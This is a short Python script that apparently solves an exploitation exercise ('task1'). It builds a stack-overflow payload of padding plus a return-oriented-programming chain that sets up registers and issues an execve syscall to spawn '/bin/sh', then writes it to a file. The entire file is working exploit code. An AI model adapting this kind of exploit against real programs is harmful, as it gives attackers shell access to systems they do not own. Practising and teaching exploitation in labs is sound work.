#!/usr/bin/env python3

from struct import *


if __name__ == '__main__':
	buf = b'A'*56
	buf += pack('<Q', 0x401160)         # xor rax, rax ; pop rdx ; pop rdi; pop rsi ; ret;
	buf += pack('<Q', 0x404048)         # new rdx - pointer to 0
	buf += pack('<Q', 0x404040)         # new rdi - pointer to "/bin/sh"
	buf += pack('<Q', 0x404048)         # new rsi - pointer to 0
	buf += pack('<Q', 0x401167) * 0x3b  # inc rax ; ret
	buf += pack('<Q', 0x40115e)         # syscall

	with open('task1.exp', 'wb+') as f:
		f.write(buf)
